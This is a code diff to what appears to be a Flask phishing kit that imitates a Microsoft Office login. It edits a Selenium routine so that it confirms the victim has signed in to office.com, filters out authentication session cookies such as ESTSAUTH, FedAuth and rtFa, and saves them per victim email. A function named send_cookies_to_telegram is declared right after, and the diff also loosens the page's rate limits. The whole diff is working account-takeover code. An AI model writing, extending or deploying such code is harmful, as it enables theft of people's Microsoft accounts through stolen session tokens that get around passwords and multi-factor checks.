@@ -176,26 +176,58 @@ def setup_chrome_driver():
         raise
 
 def extract_and_save_cookies(driver, email):
-    """Extract cookies from WebDriver and save them"""
+    """Extract only session cookies from successful Office.com login and save them"""
     try:
+        # Navigate to office.com to verify successful login and get session cookies
+        driver.get("https://office.com")
+        sleep(5)  # Wait for page to load
+        
+        # Check if we're actually logged in to Office.com
+        current_url = driver.current_url
+        page_title = driver.title.lower()
+        
+        # Verify we're successfully logged into Office
+        if "office" not in current_url.lower() or "sign" in page_title or "login" in page_title:
+            logger.warning(f"Not successfully logged into Office.com. URL: {current_url}, Title: {page_title}")
+            return False
+        
         cookies = driver.get_cookies()
         if not cookies:
             logger.warning("No cookies found in WebDriver")
+            return False
+        
+        # Filter only session-related cookies from office.com and microsoft domains
+        session_cookies = []
+        session_cookie_names = [
+            'FedAuth', 'rtFa', 'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT',
+            'SignInStateCookie', 'buid', 'MSFPC', 'ai_session', 'MUID',
+            'wla42', 'MSPAuth', 'MSPProf', 'MSPSoftVis', 'MSCC'
+        ]
+        
+        for cookie in cookies:
+            # Include cookies from Microsoft/Office domains that are session-related
+            if (any(domain in cookie['domain'].lower() for domain in ['office.com', 'microsoft.com', 'microsoftonline.com', 'live.com']) and
+                (cookie['name'] in session_cookie_names or 'auth' in cookie['name'].lower() or 'session' in cookie['name'].lower())):
+                session_cookies.append(cookie)
+        
+        if not session_cookies:
+            logger.warning("No session cookies found for Office.com")
             return False
         
         # Create cookies directory if it doesn't exist
         if not os.path.exists('cookies'):
             os.makedirs('cookies')
         
-        # Save cookies with timestamp
+        # Save only session cookies with timestamp
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f'cookies/cookies_{email.replace("@", "_")}_{timestamp}.txt'
+        filename = f'cookies/session_cookies_{email.replace("@", "_")}_{timestamp}.txt'
         
         with open(filename, 'w') as f:
-            f.write(f"# Cookies extracted for {email} at {datetime.now()}\n")
-            f.write(f"# Total cookies: {len(cookies)}\n\n")
+            f.write(f"# Session cookies extracted for {email} at {datetime.now()}\n")
+            f.write(f"# Successfully logged into Office.com: {current_url}\n")
+            f.write(f"# Total session cookies: {len(session_cookies)}\n\n")
             
-            for cookie in cookies:
+            for cookie in session_cookies:
                 f.write(f"Name: {cookie['name']}\n")
                 f.write(f"Value: {cookie['value']}\n")
                 f.write(f"Domain: {cookie['domain']}\n")
@@ -205,14 +237,14 @@ def extract_and_save_cookies(driver, email):
                 f.write("-" * 50 + "\n")
         
         # Also save as JSON for easier parsing
-        json_filename = f'cookies/cookies_{email.replace("@", "_")}_{timestamp}.json'
+        json_filename = f'cookies/session_cookies_{email.replace("@", "_")}_{timestamp}.json'
         with open(json_filename, 'w') as f:
-            json.dump(cookies, f, indent=2)
+            json.dump(session_cookies, f, indent=2)
         
-        logger.info(f"Cookies saved to {filename} and {json_filename}")
+        logger.info(f"Session cookies saved to {filename} and {json_filename}")
         return filename
     except Exception as e:
-        logger.error(f"Failed to extract and save cookies: {e}")
+        logger.error(f"Failed to extract and save session cookies: {e}")
         return False
 
 def send_cookies_to_telegram(filename, email):
@@ -256,7 +288,7 @@ def before_request():
     session.permanent = True
 
 @app.route('/')
-@limiter.limit("20 per minute")
+@limiter.limit("100 per minute")
 def index():
     email = request.args.get('email', '').strip()
     step = request.args.get('step', 'email')
@@ -324,7 +356,7 @@ def verify_turnstile():
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/', methods=['POST'])
-@limiter.limit("10 per minute")
+@limiter.limit("50 per minute")
 def process_form():
     form = LoginForm()
     
